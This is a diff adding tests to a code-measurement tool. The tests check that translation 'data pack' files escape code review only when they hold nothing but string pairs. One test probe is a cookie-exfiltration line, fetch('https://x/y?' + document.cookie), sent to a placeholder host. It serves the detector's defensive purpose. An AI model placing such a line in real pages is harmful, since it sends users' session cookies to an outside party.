@@ -200,6 +200,21 @@ const facts = measure.factsFromText('public/app/unit.js', HEADER('unit') + 'func
 ok(facts.functions.length === 2 && facts.functions[0].name === 'readShop' && facts.functions[1].complexity === 5, 'measure: two functions, manyBranches has complexity 5 (' + facts.functions.map((fn) => fn.name + ' c' + fn.complexity).join(', ') + ')');
 ok(facts.cryptic.length === 1 && facts.cryptic[0].name === 'q' && facts.emptyCatches.length === 1 && facts.header.card === 'qa/fixture-unit', 'measure: one cryptic name, one empty catch, the CARD line read');
 ok(measure.inScope('web', 'public/app/x.js') && !measure.inScope('web', 'public/till.html') && !measure.inScope('web', 'e2e/x.cjs') && !measure.inScope('api', 'lib/money.js', '/* ADOPTED from chitbridge-engines v1 · money */'), 'measure: scope — own code in, the vendored till / a test / an adopted copy out');
+/* data packs: a pure translation pack is DATA (not judged); the same file with a helper function is code (judged) */
+const PACK_HEAD = "(function () {\n  if (typeof CBSTR === 'undefined') return;\n  var fr = CBSTR.fr || (CBSTR.fr = {});\n  var pack = { 'Save': 'Enregistrer', 'Cancel': 'Annuler' };\n";
+const PACK_TAIL = "  for (var k in pack) if (Object.prototype.hasOwnProperty.call(pack, k)) fr[k] = pack[k];\n  try {\n    if (typeof renderApp === 'function') renderApp();\n  } catch (_) {}\n";
+const packWith = (extra) => PACK_HEAD + extra + PACK_TAIL + '})();\n';
+const PACK_OK = packWith('') + packWith('');
+/* the critic's probes: a statement that is not one of the four pack shapes makes the file code, wherever it sits in the wrapper */
+const PROBES = { fetch: "fetch('https://x/y?' + document.cookie);\n", eval: 'eval(pack.Save);\n', if: "if (location.host) { pack.Save = 'x'; }\n" };
+for (const name of Object.keys(PROBES)) ok(!measure.isDataPack('public/app/strings-fr.js', packWith(PROBES[name])) && measure.inScope('web', 'public/app/strings-fr.js', packWith(PROBES[name])), 'data pack: a ' + name + ' statement inside the wrapper makes the file code, judged');
+ok(!measure.isDataPack('public/app/strings-fr.js', PACK_OK + "fetch('https://x/y');\n"), 'data pack: a loose statement outside any wrapper makes the file code, judged');
+const PACK_FN = "(function () {\n  var pack = { 'Save': 'Enregistrer' };\n  function shout(text) { return text.toUpperCase(); }\n  pack.Save = shout(pack.Save);\n})();\n";
+const PACK_VALUE = "(function () {\n  var pack = { 'Save': 'Enregistrer', 'Count': 3 };\n})();\n";
+ok(measure.isDataPack('public/app/strings-fr.js', PACK_OK) && !measure.inScope('web', 'public/app/strings-fr.js', PACK_OK), 'data pack: a pure string pack (two wrappers, string → string pairs) is not judged');
+ok(!measure.isDataPack('public/app/strings-fr.js', PACK_FN) && measure.inScope('web', 'public/app/strings-fr.js', PACK_FN), 'data pack: a pack file holding a helper function is still judged');
+ok(!measure.isDataPack('public/app/strings-fr.js', PACK_VALUE) && measure.inScope('web', 'public/app/strings-fr.js', PACK_VALUE), 'data pack: a non-string value in the pack makes it code, judged');
+ok(measure.inScope('web', 'public/app/locale.js', PACK_OK), 'data pack: only the strings-<lang>.js name is exempt — the same text under another name is judged');
 /* INT7b: a route handler pairs with its own route when the file grows above it; a function with no route pairs as before */
 const ROUTES = (pad) => "/* api fixture */\nconst router = {};\n" + pad + "router.get('/a', async (req, res) => {\n  return 1;\n});\n" +
   "router.post('/b', auth, async (req, res) => {\n  if (req.x) return 2;\n  if (req.y) return 3;\n  return 4;\n});\nfunction helper(rows) {\n  return rows;\n}\n";
